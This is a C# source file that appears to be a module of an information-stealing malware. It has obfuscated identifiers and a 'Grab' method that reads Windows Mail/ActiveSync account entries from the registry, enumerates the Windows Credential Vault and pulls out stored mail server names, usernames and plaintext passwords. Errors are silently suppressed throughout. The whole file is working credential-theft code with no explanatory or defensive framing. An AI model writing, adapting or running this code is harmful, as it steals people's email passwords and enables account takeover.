using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using C6Zy;
using Microsoft.Win32;
using UHyll;

namespace rk937aHHc
{
	public class Windows_MailApp : EtbH
	{
		public Windows_MailApp()
		{
			this.T6H05 = "Windows Mail App";
		}

		public string T6H05 { get; set; }

        public List<WTitxI2m> Grab()
        {
            Environment.SetEnvironmentVariable(
                "COMPlus_legacyCorruptedStateExceptionsPolicy", "1"
            );

            List<WTitxI2m> list = new List<WTitxI2m>();

            try
            {
                using (RegistryKey partnersKey =
                    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\ActiveSync\\Partners"))
                {
                    if (partnersKey == null)
                        return list;

                    foreach (string partnerName in partnersKey.GetSubKeyNames())
                    {
                        using (RegistryKey partnerKey = partnersKey.OpenSubKey(partnerName))
                        {
                            if (partnerKey == null)
                                continue;

                            string username = partnerKey.GetValue("Email") as string;
                            string host = partnerKey.GetValue("Server") as string;

                            Version ver = Environment.OSVersion.Version;
                            int major = ver.Major;
                            int minor = ver.Minor;

                            Type vaultItemType =
                                (major >= 6 && minor >= 2)
                                ? typeof(FNu.qXj)          // Win8+
                                : typeof(FNu.Vca7szkAbA);  // Win7

                            int vaultCount = 0;
                            IntPtr vaultGuidPtr = IntPtr.Zero;

                            if (FNu.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr) != 0)
                                continue;

                            IntPtr currentVaultGuidPtr = vaultGuidPtr;

                            for (int i = 0; i < vaultCount; i++)
                            {
                                Guid vaultGuid = (Guid)Marshal.PtrToStructure(
                                    currentVaultGuidPtr, typeof(Guid));

                                currentVaultGuidPtr += Marshal.SizeOf(typeof(Guid));

                                IntPtr vaultHandle = IntPtr.Zero;
                                if (FNu.VaultOpenVault(ref vaultGuid, 0, ref vaultHandle) != 0)
                                    continue;

                                int itemCount = 0;
                                IntPtr itemPtr = IntPtr.Zero;

                                if (FNu.VaultEnumerateItems(vaultHandle, 512, ref itemCount, ref itemPtr) != 0)
                                    continue;

                                IntPtr currentItemPtr = itemPtr;

                                for (int j = 0; j < itemCount; j++)
                                {
                                    try
                                    {
                                        object vaultItem =
                                            Marshal.PtrToStructure(currentItemPtr, vaultItemType);

                                        if (IntPtr.Size == 8)
                                            currentItemPtr += Marshal.SizeOf(vaultItemType);
                                        else
                                            currentItemPtr += Marshal.SizeOf(vaultItemType) - 8;

                                        Guid schemaId = new Guid(
                                            vaultItemType.GetField("SchemaId")
                                                .GetValue(vaultItem)
                                                .ToString());

                                        IntPtr pResource =
                                            (IntPtr)vaultItemType
                                                .GetField("pResourceElement")
                                                .GetValue(vaultItem);

                                        IntPtr pIdentity =
                                            (IntPtr)vaultItemType
                                                .GetField("pIdentityElement")
                                                .GetValue(vaultItem);

                                        IntPtr pPackageSid = IntPtr.Zero;
                                        IntPtr itemHandle = IntPtr.Zero;
                                        int status;

                                        if (major >= 6 && minor >= 2)
                                        {
                                            pPackageSid =
                                                (IntPtr)vaultItemType
                                                    .GetField("pPackageSid")
                                                    .GetValue(vaultItem);

                                            status = FNu.VaultGetItem_WIN8(
                                                vaultHandle,
                                                ref schemaId,
                                                pResource,
                                                pIdentity,
                                                pPackageSid,
                                                IntPtr.Zero,
                                                0,
                                                ref itemHandle);
                                        }
                                        else
                                        {
                                            status = FNu.VaultGetItem_WIN7(
                                                vaultHandle,
                                                ref schemaId,
                                                pResource,
                                                pIdentity,
                                                IntPtr.Zero,
                                                0,
                                                ref itemHandle);
                                        }

                                        if (status != 0)
                                            continue;

                                        object fullItem =
                                            Marshal.PtrToStructure(itemHandle, vaultItemType);

                                        IntPtr pAuthenticator =
                                            (IntPtr)vaultItemType
                                                .GetField("pAuthenticatorElement")
                                                .GetValue(fullItem);

                                        object passwordObj = FNu.PlKuS(pAuthenticator);
                                        if (passwordObj == null)
                                            continue;

                                        string resource = FNu.PlKuS(pResource) as string;
                                        if (string.IsNullOrEmpty(resource))
                                            continue;

                                        if (resource.ToLower().StartsWith("syncpassword") &&
                                            resource.Contains(partnerName) &&
                                            resource.ToLower().Contains("mailoutgoing"))
                                        {
                                            list.Add(new WTitxI2m
                                            {
                                                data1 = host,
                                                data2 = username,
                                                data3 = (string)passwordObj,
                                                data4 = this.T6H05
                                            });
                                        }
                                    }
                                    catch
                                    {
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return list;
        }
    }
}
